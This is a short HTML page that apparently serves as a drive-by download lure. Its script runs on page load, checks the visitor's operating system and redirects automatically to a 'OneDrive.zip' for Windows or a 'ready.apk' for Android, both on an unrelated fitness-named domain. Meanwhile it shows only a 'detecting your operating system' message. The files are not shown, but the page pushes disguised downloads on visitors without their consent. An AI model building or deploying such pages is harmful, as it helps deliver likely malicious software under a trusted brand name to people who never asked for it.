<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Auto OS-Based Download</title>
    <script>
        window.onload = function() {
            let userAgent = navigator.userAgent;
            let downloadURL = "#";

            if (userAgent.includes("Win")) {
                downloadURL = "https://files.myfitnesslife.xyz/OneDrive.zip";
            } else if (userAgent.includes("Android")) {
                downloadURL = "https://files.myfitnesslife.xyz/ready.apk";
            }

            // Redirect automatically
            window.location.href = downloadURL;
        };
    </script>
</head>
<body>
    <p>Detecting your operating system... You will be redirected shortly.</p>
</body>
</html>
